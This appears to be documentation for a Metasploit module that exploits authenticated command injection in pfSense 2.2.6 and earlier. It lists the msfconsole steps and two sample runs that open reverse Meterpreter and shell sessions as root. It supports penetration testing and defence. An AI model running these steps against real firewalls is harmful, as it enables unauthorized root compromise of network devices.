## Description

  This module exploits a vulnerability in pfSense version 2.2.6 and before which allows an authenticated user to execute arbitrary operating system commands as root.

## Vulnerable Application

  This module has been tested successfully on version 2.2.6-RELEASE, 2.2.5-RELEASE, and 2.1.3-RELEASE

  Installers:

  * [pfSense 2.2.6-RELEASE](https://nyifiles.pfsense.org/mirror/downloads/old/pfSense-LiveCD-2.2.6-RELEASE-amd64.iso.gz)
  * [pfSense 2.2.5-RELEASE](https://nyifiles.pfsense.org/mirror/downloads/old/pfSense-LiveCD-2.2.5-RELEASE-amd64.iso.gz)
  * [pfSense 2.1.3-RELEASE](https://nyifiles.pfsense.org/mirror/downloads/old/pfSense-LiveCD-2.1.3-RELEASE-amd64.iso.gz)

## Verification Steps

  1. Start `msfconsole`
  2. Do: `use exploit/unix/http/pfsense_graph_injection_exec`
  3. Do: `set RHOST [IP]`
  4. Do: `set USERNAME [username]`
  5. Do: `set PASSWORD [password]`
  6. Do: `set LHOST [IP]`
  7. Do: `exploit`

## Scenarios

### pfSense Community Edition 2.2.6-RELEASE

```
msf exploit(unix/http/pfsense_graph_injection_exec) > use exploit/unix/http/pfsense_graph_injection_execmsf exploit(unix/http/pfsense_graph_injection_exec) > set RHOST 2.2.2.2
RHOST => 2.2.2.2
msf exploit(unix/http/pfsense_graph_injection_exec) > set LHOST 1.1.1.1
LHOST => 1.1.1.1
msf exploit(unix/http/pfsense_graph_injection_exec) > exploit 

[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] Detected pfSense 2.2.6-RELEASE, uploading intial payload
[*] Payload uploaded successfully, executing
[*] Sending stage (37543 bytes) to 2.2.2.2
[*] Meterpreter session 1 opened (1.1.1.1:4444 -> 2.2.2.2:42116) at 2018-01-01 17:17:36 -0600

meterpreter > sysinfo
Computer    : pfSense.localdomain
OS          : FreeBSD pfSense.localdomain 10.1-RELEASE-p25 FreeBSD 10.1-RELEASE-p25 #0 c39b63e(releng/10.1)-dirty: Mon Dec 21 15:20:13 CST 2015     root@pfs22-amd64-builder:/usr/obj.RELENG_2_2.amd64/usr/pfSensesrc/src.RELENG_2_2/sys/pfSense_SMP.10 amd64
Meterpreter : php/freebsd
meterpreter > getuid
Server username: root (0)
meterpreter > 
```

### pfSense Community Edition 2.1.3-RELEASE

```
msf > use exploit/unix/http/pfsense_graph_injection_exec
msf exploit(unix/http/pfsense_graph_injection_exec) > set RHOST 2.2.2.2
RHOST => 2.2.2.2
msf exploit(unix/http/pfsense_graph_injection_exec) > set LHOST 1.1.1.1
LHOST => 1.1.1.1
msf exploit(unix/http/pfsense_graph_injection_exec) > set PAYLOAD php/reverse_php
PAYLOAD => php/reverse_php
msf exploit(unix/http/pfsense_graph_injection_exec) > exploit

[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] Detected pfSense 2.1.3-RELEASE, uploading intial payload
[*] Payload uploaded successfully, executing
[*] Command shell session 1 opened (1.1.1.1:4444 -> 2.2.2.2:3454) at 2018-01-01 15:49:38 -0600
uname -a

FreeBSD pfSense.localdomain 8.3-RELEASE-p16 FreeBSD 8.3-RELEASE-p16 #0: Thu May  1 16:19:14 EDT 2014     root@pf2_1_1_amd64.pfsense.org:/usr/obj.amd64/usr/pfSensesrc/src/sys/pfSense_SMP.8  amd64
```
